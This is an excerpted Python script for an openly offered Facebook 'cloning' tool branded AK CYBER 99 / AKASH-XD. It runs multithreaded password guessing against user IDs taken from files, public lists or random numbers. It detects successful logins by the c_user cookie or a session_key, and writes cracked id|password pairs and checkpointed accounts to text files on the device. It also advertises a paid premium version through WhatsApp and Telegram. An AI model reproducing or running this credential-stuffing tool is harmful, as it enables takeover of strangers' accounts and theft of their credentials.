...
os.system('xdg-open \033[38;5;46m')
...
\033[38;5;49m═════════════════════════════════════
\033[38;5;47m     [✔]𝘼𝙆 𝘾𝙔𝘽𝙀𝙍 𝟵𝟵😱
\033[38;5;47m     [✔]𝗩𝗘𝗥𝗦𝗜𝗢𝗡 {𝟗.1}🎉
\033[38;5;47m     [✔]𝐖𝐎𝐑𝐊 𝐃𝐀𝐓𝐀 𝐖𝐈𝐅𝐈💯
\033[38;5;47m     [✔]𝐏𝐀𝐈𝐃 𝐂𝐎𝐌𝐌𝐀𝐍𝐃😭
\033[38;5;47m     [✔]𝐅𝐑𝐎𝐌 𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇 🥀
\033[38;5;49m═════════════════════════════════════
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
...
def public():
        ...
        for met in range(jum):
                ...
                usrr.append(kl)
        linex()
        print(' \033[38;5;46mAll method working try 1 by 1 ')
        linex()
        print(' \033[38;5;46m[1] Method 1 (for new ids) \n [2] Method 2 (for old ids)\n [3] Method 3 (for old ids)')
        linex()
        mthd = input(' \033[38;5;46mChoose method: ')
        linex()
        print(' \033[38;5;46mDo you went show cp account? (y/n): ')
        linex()
        cx=input(' \033[38;5;46mChoose: ')
        ...
        try:
                plist = []
                try:
                        ps_limit = int(input(' \033[38;5;46mHow many passwords do you want to add ? '))
                except:
                        ps_limit =1
                linex()
...
def menu():
        ...
        #       chk()
                x = ("sex")
                if x == ("sex"):
                        print(' \033[38;5;46m[1] File cloning\n [2] Create ids file\n [3] Public cloning\n [4] Random number cloning\n [5] Random gmail crack\n [6] Telegram Group (join)\n [7] Telegram\n [8] How To Use Video\n [0] Exit menu')
                        linex()
                        xd=input(' Choose an option: ')
                        if xd in ['1','01']:
                                clear()
                                print(' \033[38;5;46mPut file example:  /sdcard/File.txt  etc..')
                                linex()
                                file = input(' \033[38;5;46mPut file path\033[1;37m: ')
                                try:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print(' \033[38;5;46mTotal account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
                                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                ...
                                os.system(f'xdg-open https://t.me/EHC99EMRAN{wx}');menu()
                        elif xd in ['7','07']:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+9710569549857&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi Bikash Sir, I Need To Buy Your Paid EMRAN PRO Tools Version 2.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python akash.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                try:
                        limit = int(input('\033[1;31m example: 1000, 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [AKASH-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [𝑨𝑲𝑨𝑺𝑯-OK] %s | %s'%(ids,pas))
                                open('/sdcard/𝑨𝑲𝑨𝑺𝑯-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [𝑨𝑲𝑨𝑺𝑯-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/𝑨𝑲𝑨𝑺𝑯-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [𝑨𝑲𝑨𝑺𝑯-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/𝑨𝑲𝑨𝑺𝑯-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/𝑨𝑲𝑨𝑺𝑯-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [𝑨𝑲𝑨𝑺𝑯-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/𝑨𝑲𝑨𝑺𝑯-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [𝑨𝑲𝑨𝑺𝑯-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/𝘼𝙆𝘼𝙎𝙃-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
